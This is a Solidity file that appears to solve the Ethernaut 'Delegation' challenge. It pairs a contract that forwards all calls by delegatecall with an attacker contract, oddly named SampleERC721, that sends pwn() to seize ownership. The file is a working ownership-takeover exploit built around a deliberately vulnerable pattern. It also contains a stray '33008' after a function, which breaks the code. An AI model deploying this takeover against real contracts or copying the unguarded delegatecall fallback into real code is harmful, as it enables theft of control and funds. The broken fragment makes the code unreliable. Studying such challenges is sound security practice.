// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract Delegate {

  address public owner;
  // 0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db

  constructor(address _owner) public {
    owner = _owner;
  }


  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

function getSender() public view returns(address) {
    return msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}

interface Token { 
  function owner() external view returns(address);
  function getSender() external view returns(address);
  function pwn() external;
}

contract SampleERC721  {
   //using SafeMath for uint256;
    address external_contract;
    Token external_contract_i;

    address public constant OTHER_CONTRACT = 0xC4FA8Ef3914b2b09714Ebe35D1Fb101F98aAd13b;

    constructor(address _delegateAddress){
        external_contract = _delegateAddress;
        external_contract_i = Token(_delegateAddress);
    }

    function getOwner() public returns(bytes memory) {
        (bool success, bytes memory data) = external_contract.call(abi.encodeWithSignature("owner()"));
        return data;
    }33008

    function getOwner1() public view returns(address) {
        return external_contract_i.owner();
    }

    function getSender() public view returns(address) {
        return external_contract_i.getSender();
    }

    function pwn1() public {
        external_contract_i.pwn();
    }

    function getTest() public returns(bytes memory) {
        (bool success, bytes memory data) = external_contract.call(abi.encodeWithSignature("getSender()"));
        return data;
    }

    function getData() public pure returns(bytes memory) {
        return abi.encodeWithSignature("pwn()");
    }

    function pwn() public {
        (bool success,) = external_contract.delegatecall(msg.data);
        require(success);
    }

}
